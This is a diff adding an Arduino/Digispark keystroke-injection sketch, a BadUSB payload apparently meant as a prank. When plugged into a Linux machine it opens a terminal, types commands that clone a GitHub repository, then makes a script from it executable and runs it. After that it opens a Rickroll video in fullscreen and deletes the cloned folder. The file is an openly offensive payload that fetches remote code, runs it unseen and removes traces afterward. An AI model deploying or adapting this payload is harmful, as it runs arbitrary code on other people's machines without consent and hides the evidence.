@@ -1,0 +1,46 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+}
+
+void loop() { 
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  // Open Terminal
+  openTerminal();
+  // Get script
+  runCommand("git clone https://github.com/Bernadetten/renamed");
+  DigiKeyboard.delay(4000);
+  // Got to script
+  runCommand("cd renamed/");
+  // Make script executable
+  runCommand("chmod u+x script.sh");
+  // Run script
+  runCommand("./script.sh");
+  DigiKeyboard.delay(2000);
+  // Open link
+  runCommand("xdg-open https://youtu.be/dQw4w9WgXcQ?t=43s");
+  DigiKeyboard.delay(6000);
+  // Fullscreen
+  DigiKeyboard.sendKeyStroke(KEY_F);
+  // Start video
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+
+  DigiKeyboard.delay(5000);
+  openTerminal();
+  runCommand("rm -rf renamed/");
+  for (;;) {
+    /*empty*/
+  } 
+}
+
+void runCommand(String command){
+  DigiKeyboard.print(command);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  }
+
+void openTerminal(){
+  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  }
